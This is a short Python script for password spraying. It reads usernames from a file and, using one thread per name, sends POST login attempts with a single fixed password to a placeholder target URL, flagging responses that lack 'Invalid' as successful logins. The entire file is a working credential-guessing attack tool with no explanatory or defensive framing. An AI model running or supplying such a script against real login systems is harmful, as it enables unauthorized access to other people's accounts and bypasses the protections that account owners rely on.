import httpx
import threading

with open('usernames.txt', 'r') as f:
    usernames = [line.strip() for line in f if line.strip() != ""]

password = 'PASSWORD_HERE'
url = 'IP_HERE'


def try_login(username):
    print(f'Attempting login with username: {username}')
    data = {'username': username, 'password': password, 'submit': 'Login'}
    with httpx.Client() as client:
        response = client.post(url, data=data)
        if 'Invalid' not in response.text:
            print(f'\033[43m\033[30mSuccessful login with username: {username}\033[0m')
            print(response.text)


# Create a thread for each username
threads = []
for username in usernames:
    thread = threading.Thread(target=try_login, args=(username,))
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()
